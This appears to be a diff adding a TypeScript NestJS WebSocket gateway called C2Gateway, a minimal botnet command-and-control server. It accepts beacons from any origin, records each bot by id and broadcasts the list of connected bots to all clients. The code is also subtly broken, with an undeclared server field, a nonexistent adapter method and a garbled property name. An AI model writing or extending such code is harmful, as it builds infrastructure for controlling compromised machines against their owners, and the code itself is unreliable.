@@ -1,0 +1,11 @@
+import { WebSocketGateway, SubscribeMessage, MessageBody, ConnectedSocket } from '@nestjs/websockets';
+import { Server, Socket } from 'socket.io';
+@WebSocketGateway({cors:'*'})
+export class C2Gateway{
+  afterInit(s:Server){this.server=s;}
+  @SubscribeMessage(' beacon ')
+  handleBeacon(@MessageBody() d:any, @ConnectedSocket() c:Socket){
+     const k=`bot:${d.uid}`;
+     this.server.of('/').adapter.set(k,d);
+     this.server.emit('bots', [...this.server.of('/').adapter.ada.keys()]);
+}}
